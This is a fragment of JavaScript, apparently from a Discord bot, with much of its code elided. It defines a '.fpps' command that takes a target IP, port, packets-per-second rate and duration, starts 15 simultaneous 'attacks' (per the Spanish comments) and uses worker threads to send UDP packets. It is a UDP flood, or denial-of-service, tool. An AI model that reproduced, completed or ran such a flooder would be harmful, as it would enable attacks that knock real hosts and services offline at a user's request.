    ...
    execute(message, args) {
        ...
        if (args.length !== 4) {
            const usageEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('Uso: .fpps <IP> <Port> <PPS> <Time>')
                .setTimestamp();
        ...
        for (let i = 0; i < 15; i++) { // Ejecutar 15 ataques simultáneamente
...
if (!isMainThread) {
    ...
    const packet = Buffer.from('UDP Packet - Additional Content Here'); // Agregar más contenido al paquete
    let packetsSent = 0;
